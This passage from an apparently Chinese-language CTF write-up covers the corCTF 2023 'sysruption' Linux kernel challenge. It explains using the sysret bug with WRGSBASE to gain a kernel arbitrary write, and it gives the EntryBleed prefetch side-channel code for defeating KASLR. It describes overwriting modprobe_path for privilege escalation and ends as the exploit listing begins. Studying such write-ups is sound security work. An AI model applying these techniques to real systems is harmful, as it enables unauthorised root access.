+<p>这里可以看到有很多压栈操作,而由于我们可以控制进入GPF的rsp,因此就可以导致出现任意写的操作,<br>这里还有一个点就是在 <code>0xffffffff81a01203</code>会进行一个比较,这里是在比较的栈上所存储的值是在执行sysret出现GP异常的过程中在栈上保存的cs寄存器的值,这里由于我们仍然是内核态,所以值为0x10,因此不会进行下面的swapgs<br>然后这样在error_entry跳出进入<code>exc_general_protection</code>会出现问题,其中代码如下:</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">pwndbg&gt; x/20i exc_general_protection <br>   <span class="hljs-number">0xffffffff81816050</span> &lt;exc_general_protection&gt;:	<span class="hljs-keyword">push</span>   <span class="hljs-built_in">r14</span><br>   <span class="hljs-number">0xffffffff81816052</span> &lt;exc_general_protection+<span class="hljs-number">2</span>&gt;:	<span class="hljs-keyword">push</span>   <span class="hljs-built_in">r13</span><br>   <span class="hljs-number">0xffffffff81816054</span> &lt;exc_general_protection+<span class="hljs-number">4</span>&gt;:	<span class="hljs-keyword">push</span>   <span class="hljs-built_in">r12</span><br>   <span class="hljs-number">0xffffffff81816056</span> &lt;exc_general_protection+<span class="hljs-number">6</span>&gt;:	<span class="hljs-keyword">push</span>   <span class="hljs-built_in">rbp</span><br>   <span class="hljs-number">0xffffffff81816057</span> &lt;exc_general_protection+<span class="hljs-number">7</span>&gt;:	<span class="hljs-keyword">push</span>   <span class="hljs-built_in">rbx</span><br>   <span class="hljs-number">0xffffffff81816058</span> &lt;exc_general_protection+<span class="hljs-number">8</span>&gt;:	<span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rbx</span>,<span class="hljs-built_in">rdi</span><br>   <span class="hljs-number">0xffffffff8181605b</span> &lt;exc_general_protection+<span class="hljs-number">11</span>&gt;:	<span class="hljs-keyword">sub</span>    <span class="hljs-built_in">rsp</span>,<span class="hljs-number">0x70</span><br>   <span class="hljs-number">0xffffffff8181605f</span> &lt;exc_general_protection+<span class="hljs-number">15</span>&gt;:	<span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r12</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> <span class="hljs-built_in">gs</span>:<span class="hljs-number">0x28</span><br></code></pre></td></tr></table></figure>
+<p>看到最后一行我们是调用了gs寄存器,而由于我们在sysret之前就进行swapgs将gs切换成了我们的用户gs(默认为0,因为用户态不用),因此报错的原因就出现在内核态的GPF中使用gs寄存器的时候发现不是处于特权段从而报错,因此我们接下来的目标便是修改我们的这个gs_base的值为一个内核的值,当然最好的情况就是内核本身处于内核态的时候所拥有的gs_base</p>
+<h1 id="0x03-修改用户gs-base"><a href="#0x03-修改用户gs-base" class="headerlink" title="0x03 修改用户gs_base"></a>0x03 修改用户gs_base</h1><p>由于用户态已经弃用gs_base,所以我们修改它理论上是不会有任何问题的,而我们查看ptrace系统调用的<code>PTRACE_SETREGS</code>标志位的时候使用到的寄存器数据结构是拥有gs_base的</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_regs_struct</span> &#123;</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>	r15;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>	r14;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>	r13;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>	r12;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>	bp;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>	bx;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>	r11;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>	r10;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>	r9;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>	r8;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>	ax;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>	cx;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>	dx;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>	si;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>	di;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>	orig_ax;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>	ip;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>	cs;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>	flags;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>	sp;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>	ss;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>	fs_base;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>	gs_base;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>	ds;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>	es;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>	fs;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>	gs;<br>&#125;;<br></code></pre></td></tr></table></figure>
+
+<p>所以我们实际上可以尝试直接使用ptrace来对syscall进行修改,但是我们最终会发现修改并不会生效,实际源码可以查看 </p>
+<figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xl">arch_ptrace<br>    copy_regset_from_user<br>        <span class="hljs-function"><span class="hljs-title">regset</span>-&gt;</span>sets   genregs_set<br>            putreg<br></code></pre></td></tr></table></figure>
+
+<p>最后看到putreg代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">putreg</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> task_struct *child,</span><br><span class="hljs-params">		  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> offset, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> value)</span><br>&#123;<br>	<span class="hljs-keyword">switch</span> (offset) &#123;<br>	<span class="hljs-keyword">case</span> <span class="hljs-title function_">offsetof</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> user_regs_struct, cs)</span>:<br>	<span class="hljs-keyword">case</span> <span class="hljs-title function_">offsetof</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> user_regs_struct, ds)</span>:<br>	<span class="hljs-keyword">case</span> <span class="hljs-title function_">offsetof</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> user_regs_struct, es)</span>:<br>	<span class="hljs-keyword">case</span> <span class="hljs-title function_">offsetof</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> user_regs_struct, fs)</span>:<br>	<span class="hljs-keyword">case</span> <span class="hljs-title function_">offsetof</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> user_regs_struct, gs)</span>:<br>	<span class="hljs-keyword">case</span> <span class="hljs-title function_">offsetof</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> user_regs_struct, ss)</span>:<br>		<span class="hljs-keyword">return</span> <span class="hljs-title function_">set_segment_reg</span><span class="hljs-params">(child, offset, value)</span>;<br><br>	<span class="hljs-keyword">case</span> <span class="hljs-title function_">offsetof</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> user_regs_struct, flags)</span>:<br>		<span class="hljs-keyword">return</span> <span class="hljs-title function_">set_flags</span><span class="hljs-params">(child, value)</span>;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_X86_64</span><br>	<span class="hljs-keyword">case</span> <span class="hljs-title function_">offsetof</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> user_regs_struct,fs_base)</span>:<br>		<span class="hljs-title function_">if</span> <span class="hljs-params">(value &gt;= TASK_SIZE_MAX)</span><br>			<span class="hljs-keyword">return</span> -EIO;<br>		x86_fsbase_write_task(child, value);<br>		<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>	<span class="hljs-keyword">case</span> <span class="hljs-title function_">offsetof</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> user_regs_struct,gs_base)</span>:<br>		<span class="hljs-title function_">if</span> <span class="hljs-params">(value &gt;= TASK_SIZE_MAX)</span><br>			<span class="hljs-keyword">return</span> -EIO;<br>		x86_gsbase_write_task(child, value);<br>		<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>	&#125;<br><br>	*pt_regs_access(task_pt_regs(child), offset) = value;<br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>我们知道如果说我们的值在设置gs_base的时候超过了TASK_SIZE_MAX(1&lt;&lt;47-0x1000),那么我们的设置就不会生效<br>所以我们这里是无法通过ptrace来将gs_base设置为一个内核指针的,那么我们该如何设置他呢?</p>
+<p>越学到后面越发掘自身的知识浅薄,不仅如此身边的宝库🪙也没曾好好利用,这里所说的就是<code>Intel圣经🐶:Intel_sdm</code>,对于任何Intel架构上的一些知识都可以到这本万能宝典查找,里面从指令集到寄存器,段选择子等描述都十分详细,虽然是英文看起来比较麻烦,但是这也让我们能原汁原味的读到官方对于某个概念的解释,这也省去了总是觉得某些翻译不太准确从而理解困难的场景</p>
+<p><code>Intel的fsgsbase已经支持一段时间了</code>,这是原作者和一血师傅都说出的一句话,因此我们去Intel手册查找他</p>
+<img src="/2024/05/23/corCTF2023-sysruption/image-20240530155200118.png" srcset="/img/loading.gif" lazyload class="">
+
+<p>着眼于WRGSBASE,这条指令允许我们可以从源寄存器当中加载gs_base,这样下去如果我们提前找到内核的gs_base的话就可以提前写入,而我们内核的gs_base在内核当中的虚拟地址在不开启KASLR的情况下是固定的,<br>我们应该就可以避免触发double_fault,我们立刻尝试一下,这里修改一下传递的rsp设置为内核地址</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">asm</span> <span class="hljs-title function_">volatile</span><span class="hljs-params">(<span class="hljs-string">&quot;wrgsbase %0&quot;</span> ::<span class="hljs-string">&quot;r&quot;</span>(kernel_gs_base))</span>;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-symbol">ctf@corctf:</span>~$ /exploit<br><span class="hljs-symbol">ctf@corctf:</span>~$ [    <span class="hljs-number">4.423377</span>] general protection fault, maybe for address <span class="hljs-number">0x4f</span>: <span class="hljs-number">0000</span> [#<span class="hljs-number">1</span>] PREEI<br>[    <span class="hljs-number">4.424848</span>] <span class="hljs-meta">CPU</span>: <span class="hljs-number">0</span> PID: <span class="hljs-number">78</span> Comm: exploit <span class="hljs-keyword">Not</span> tainted <span class="hljs-number">6.3</span><span class="hljs-number">.4</span> #<span class="hljs-number">7</span><br>[    <span class="hljs-number">4.425856</span>] Hardware name: QEMU Standard PC (i440FX + PIIX, <span class="hljs-number">1996</span>), BIOS Arch Linux <span class="hljs-number">1.16</span><span class="hljs-number">.3</span>-<span class="hljs-number">4</span><br>[    <span class="hljs-number">4.427521</span>] <span class="hljs-built_in">RIP</span>: <span class="hljs-number">0010</span>:entry_SYSRETQ_unsafe_stack+<span class="hljs-number">0x3</span>/<span class="hljs-number">0x6</span><br>[    <span class="hljs-number">4.428506</span>] Code: 3c <span class="hljs-number">25</span> d6 0f <span class="hljs-number">02</span> <span class="hljs-number">00</span> <span class="hljs-number">48</span> <span class="hljs-number">89</span> c7 eb <span class="hljs-number">08</span> <span class="hljs-number">48</span> <span class="hljs-number">89</span> c7 <span class="hljs-number">48</span> 0f ba ef 3f <span class="hljs-number">48</span> <span class="hljs-number">81</span> cf <span class="hljs-number">00</span> <span class="hljs-number">08</span> <span class="hljs-number">8</span><br>[    <span class="hljs-number">4.429542</span>] <span class="hljs-built_in">RSP</span>: <span class="hljs-number">0018</span>:ffff888000001000 EFLAGS: <span class="hljs-number">00010046</span><br>[    <span class="hljs-number">4.429776</span>] <span class="hljs-built_in">RAX</span>: 000000000000004f <span class="hljs-built_in">RBX</span>: <span class="hljs-number">0000000000000000</span> <span class="hljs-built_in">RCX</span>: <span class="hljs-number">8000000000000000</span><br>[    <span class="hljs-number">4.430094</span>] <span class="hljs-built_in">RDX</span>: <span class="hljs-number">0000000000000000</span> <span class="hljs-built_in">RSI</span>: <span class="hljs-number">0000000000000000</span> <span class="hljs-built_in">RDI</span>: <span class="hljs-number">0000000000000000</span><br>[    <span class="hljs-number">4.430412</span>] <span class="hljs-built_in">RBP</span>: <span class="hljs-number">0000000000000000</span> R08: <span class="hljs-number">0000000000000000</span> R09: <span class="hljs-number">0000000000000000</span><br>[    <span class="hljs-number">4.430731</span>] <span class="hljs-built_in">R10</span>: <span class="hljs-number">0000000000000000</span> <span class="hljs-built_in">R11</span>: <span class="hljs-number">0000000000000246</span> <span class="hljs-built_in">R12</span>: <span class="hljs-number">0000000000000000</span><br>[    <span class="hljs-number">4.431052</span>] <span class="hljs-built_in">R13</span>: <span class="hljs-number">0000000000000000</span> <span class="hljs-built_in">R14</span>: <span class="hljs-number">0000000000000000</span> <span class="hljs-built_in">R15</span>: <span class="hljs-number">0000000000000000</span><br>[    <span class="hljs-number">4.431380</span>] <span class="hljs-built_in">FS</span>:  <span class="hljs-number">0000000000000000</span>(<span class="hljs-number">0000</span>) <span class="hljs-built_in">GS</span>:ffff88813bc00000(<span class="hljs-number">0000</span>) knlGS:ffff88813bc00000<br>[    <span class="hljs-number">4.431748</span>] <span class="hljs-built_in">CS</span>:  <span class="hljs-number">0010</span> <span class="hljs-built_in">DS</span>: <span class="hljs-number">0000</span> <span class="hljs-built_in">ES</span>: <span class="hljs-number">0000</span> <span class="hljs-built_in">CR0</span>: <span class="hljs-number">0000000080050033</span><br>[    <span class="hljs-number">4.432008</span>] <span class="hljs-built_in">CR2</span>: 0000000001a74ca8 <span class="hljs-built_in">CR3</span>: 0000000100a7e005 <span class="hljs-built_in">CR4</span>: 0000000000770ef0<br>[    <span class="hljs-number">4.432329</span>] PKRU: <span class="hljs-number">55555554</span><br>[    <span class="hljs-number">4.432455</span>] <span class="hljs-keyword">Call</span> Trace:<br>[    <span class="hljs-number">4.432571</span>] Modules linked <span class="hljs-keyword">in</span>:<br>[    <span class="hljs-number">4.432713</span>] ---[ end trace <span class="hljs-number">0000000000000000</span> ]---<br>[    <span class="hljs-number">4.432922</span>] <span class="hljs-built_in">RIP</span>: <span class="hljs-number">0010</span>:entry_SYSRETQ_unsafe_stack+<span class="hljs-number">0x3</span>/<span class="hljs-number">0x6</span><br>[    <span class="hljs-number">4.433161</span>] Code: 3c <span class="hljs-number">25</span> d6 0f <span class="hljs-number">02</span> <span class="hljs-number">00</span> <span class="hljs-number">48</span> <span class="hljs-number">89</span> c7 eb <span class="hljs-number">08</span> <span class="hljs-number">48</span> <span class="hljs-number">89</span> c7 <span class="hljs-number">48</span> 0f ba ef 3f <span class="hljs-number">48</span> <span class="hljs-number">81</span> cf <span class="hljs-number">00</span> <span class="hljs-number">08</span> <span class="hljs-number">8</span><br>[    <span class="hljs-number">4.433985</span>] <span class="hljs-built_in">RSP</span>: <span class="hljs-number">0018</span>:ffff888000001000 EFLAGS: <span class="hljs-number">00010046</span><br>[    <span class="hljs-number">4.434224</span>] <span class="hljs-built_in">RAX</span>: 000000000000004f <span class="hljs-built_in">RBX</span>: <span class="hljs-number">0000000000000000</span> <span class="hljs-built_in">RCX</span>: <span class="hljs-number">8000000000000000</span><br>[    <span class="hljs-number">4.434598</span>] <span class="hljs-built_in">RDX</span>: <span class="hljs-number">0000000000000000</span> <span class="hljs-built_in">RSI</span>: <span class="hljs-number">0000000000000000</span> <span class="hljs-built_in">RDI</span>: <span class="hljs-number">0000000000000000</span><br>[    <span class="hljs-number">4.434921</span>] <span class="hljs-built_in">RBP</span>: <span class="hljs-number">0000000000000000</span> R08: <span class="hljs-number">0000000000000000</span> R09: <span class="hljs-number">0000000000000000</span><br>[    <span class="hljs-number">4.435241</span>] <span class="hljs-built_in">R10</span>: <span class="hljs-number">0000000000000000</span> <span class="hljs-built_in">R11</span>: <span class="hljs-number">0000000000000246</span> <span class="hljs-built_in">R12</span>: <span class="hljs-number">0000000000000000</span><br>[    <span class="hljs-number">4.435582</span>] <span class="hljs-built_in">R13</span>: <span class="hljs-number">0000000000000000</span> <span class="hljs-built_in">R14</span>: <span class="hljs-number">0000000000000000</span> <span class="hljs-built_in">R15</span>: <span class="hljs-number">0000000000000000</span><br>[    <span class="hljs-number">4.435900</span>] <span class="hljs-built_in">FS</span>:  <span class="hljs-number">0000000000000000</span>(<span class="hljs-number">0000</span>) <span class="hljs-built_in">GS</span>:ffff88813bc00000(<span class="hljs-number">0000</span>) knlGS:ffff88813bc00000<br>[    <span class="hljs-number">4.436259</span>] <span class="hljs-built_in">CS</span>:  <span class="hljs-number">0010</span> <span class="hljs-built_in">DS</span>: <span class="hljs-number">0000</span> <span class="hljs-built_in">ES</span>: <span class="hljs-number">0000</span> <span class="hljs-built_in">CR0</span>: <span class="hljs-number">0000000080050033</span><br>[    <span class="hljs-number">4.436524</span>] <span class="hljs-built_in">CR2</span>: 0000000001a74ca8 <span class="hljs-built_in">CR3</span>: 0000000100a7e005 <span class="hljs-built_in">CR4</span>: 0000000000770ef0<br>[    <span class="hljs-number">4.436853</span>] PKRU: <span class="hljs-number">55555554</span><br>[    <span class="hljs-number">4.436982</span>] note: exploit[<span class="hljs-number">78</span>] exited with irqs disabled<br></code></pre></td></tr></table></figure>
+
+<p>可以看到我们此时的panic报错已经不是double Fault了😸</p>
+<h1 id="0x04-怎么写-如何写-怎么写的比别人快-比别人好-bushi"><a href="#0x04-怎么写-如何写-怎么写的比别人快-比别人好-bushi" class="headerlink" title="0x04 怎么写,如何写,怎么写的比别人快,比别人好(bushi"></a>0x04 怎么写,如何写,怎么写的比别人快,比别人好(bushi</h1><p>由于截至目前我们的利用都是建立在nokaslr的条件下,因此我们在kaslr开启后需要泄漏的偏移为如下两处:</p>
+<ol>
+<li>kernel代码段的基地址,为了利用一些内核的数据结构</li>
+<li>physmap区域的基地址,这是因为内核的gs_base位于这里,并且虚拟地址是固定的</li>
+</ol>
+<p>现在已知的情报是在will’s root大师的博客当中前年发现了一个侧信道利用prefetch来绕过kaslr使用,然后顺便去年拿这个发了篇论文🧎‍♂️<br><a target="_blank" rel="noopener" href="https://www.willsroot.io/2022/12/entrybleed.html">EntryBleed</a><br>这个攻击手法就是恰好利用了KPTI所遗留的问题:<br>KPTI恰好是前几年作为熔断(Meltdown)漏洞的补丁所引入的保护措施,他将用户页表和内核页表分离开来,内核拥有所有的映射包括用户的,但是设置了NX位,而用户页表仅仅拥有自身用户态的页表部分和少部分内核的页表项(一般为系统调用入口,这些入口实现为内核函数)<br>作者利用TLB作为侧信道,当我们预取一个指令之后,下次执行这个指令的时间就会远小于正常情况下的查询页表,而x86_64恰好提供了这样一条预取指令,这里再总结一下EntryBleed的思路,这里以搜索内核代码段基地址为例:</p>
+<ol>
+<li>确定代码段基地址的范围,例如0xffffffff80000000~0xffffffff*</li>
+<li>由于KASLR的粒度为2M,因此我们将地址范围当中每隔2M的地址拿来作为victim</li>
+<li>syscall系统调用,用来保持系统调用入口<code>entry_SYSCALL_64</code>存放在TLB当中</li>
+<li>我们执行预取指令,这里预取的地址是我们的victim,如果TLB未击中则会导致预取指令去查询页表,如果TLB击中则表示该指令我们前段时间刚用过,两者差距还是比较明显</li>
+<li>记录当前地址执行的时间然后继续执行第三部遍历完整个地址池</li>
+</ol>
+<p>具体的POC直接沿用了原作者论文当中的代码,理解起来并不是很困难,这里仅给出计算时间的汇编,完整代码在最后exp里面给出:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><span class="hljs-type">uint64_t</span> <span class="hljs-title function_">sidechannel</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> addr)</span> &#123;<br>  <span class="hljs-type">uint64_t</span> a, b, c, d;<br>  <span class="hljs-keyword">asm</span> <span class="hljs-title function_">volatile</span><span class="hljs-params">(<span class="hljs-string">&quot;.intel_syntax noprefix;&quot;</span></span><br><span class="hljs-params">               <span class="hljs-string">&quot;mfence;&quot;</span></span><br><span class="hljs-params">               <span class="hljs-string">&quot;rdtscp;&quot;</span></span><br><span class="hljs-params">               <span class="hljs-string">&quot;mov %0, rax;&quot;</span></span><br><span class="hljs-params">               <span class="hljs-string">&quot;mov %1, rdx;&quot;</span></span><br><span class="hljs-params">               <span class="hljs-string">&quot;xor rax, rax;&quot;</span></span><br><span class="hljs-params">               <span class="hljs-string">&quot;lfence;&quot;</span></span><br><span class="hljs-params">               <span class="hljs-string">&quot;prefetchnta qword ptr [%4];&quot;</span></span><br><span class="hljs-params">               <span class="hljs-string">&quot;prefetcht2 qword ptr [%4];&quot;</span></span><br><span class="hljs-params">               <span class="hljs-string">&quot;xor rax, rax;&quot;</span></span><br><span class="hljs-params">               <span class="hljs-string">&quot;lfence;&quot;</span></span><br><span class="hljs-params">               <span class="hljs-string">&quot;rdtscp;&quot;</span></span><br><span class="hljs-params">               <span class="hljs-string">&quot;mov %2, rax;&quot;</span></span><br><span class="hljs-params">               <span class="hljs-string">&quot;mov %3, rdx;&quot;</span></span><br><span class="hljs-params">               <span class="hljs-string">&quot;mfence;&quot;</span></span><br><span class="hljs-params">               <span class="hljs-string">&quot;.att_syntax;&quot;</span></span><br><span class="hljs-params">               : <span class="hljs-string">&quot;=r&quot;</span>(a), <span class="hljs-string">&quot;=r&quot;</span>(b), <span class="hljs-string">&quot;=r&quot;</span>(c), <span class="hljs-string">&quot;=r&quot;</span>(d)</span><br><span class="hljs-params">               : <span class="hljs-string">&quot;r&quot;</span>(addr)</span><br><span class="hljs-params">               : <span class="hljs-string">&quot;rax&quot;</span>, <span class="hljs-string">&quot;rbx&quot;</span>, <span class="hljs-string">&quot;rcx&quot;</span>, <span class="hljs-string">&quot;rdx&quot;</span>)</span>;<br>  a = (b &lt;&lt; <span class="hljs-number">32</span>) | a;<br>  c = (d &lt;&lt; <span class="hljs-number">32</span>) | c;<br>  <span class="hljs-keyword">return</span> c - a;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>这样之后效果如下</p>
+<img src="/2024/05/23/corCTF2023-sysruption/image-20240530204618431.png" srcset="/img/loading.gif" lazyload class="">
+
+<p>然后physmap的地址随机化同样也是使用这个套路,我自己思考过为什么这个EntryBleed可以将之适用,我觉得是在syscall系统调用的地方同样使用了physmap相关的值(至少有)<br>我们只需要在关闭kaslr查看经常执行时间最小地址相对于physmap首地址的偏移,然后在之后开启kaslr之后剪掉他就得到我们的加上偏移的physmap基地址啦,这里注意他的粒度为1G </p>
+<p>这样下去我们就获得了一个在kaslr下的任意地址写原语</p>
+<h1 id="0x05-漏洞利用"><a href="#0x05-漏洞利用" class="headerlink" title="0x05 漏洞利用"></a>0x05 漏洞利用</h1><p>这里有两种思路:</p>
+<ol>
+<li>FizzBuzz大师使用到了<a target="_blank" rel="noopener" href="https://ruia-ruia.github.io/2022/08/05/CVE-2022-29582-io-uring/">CVE-2022-29582</a>中的提权手法,这里暂时还没完成:(</li>
+<li>zolutal大师则是使用了较为传统的覆写modeprobe_path,直接使用ptrace修改rsp为modeprobe_path周围的地址来覆盖掉他,这里就不过多解释,当然这里有一个注意点,那就是使用GPF来进行任意写的话可能会覆盖掉一部分重要的数据结构,师傅采用的办法是再来触发一次sysret bug来对所处的地址进行一个复原</li>
+</ol>
+<p>这里我暂时只复现了第二种方法</p>
+<p>最后利用exp如下:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span 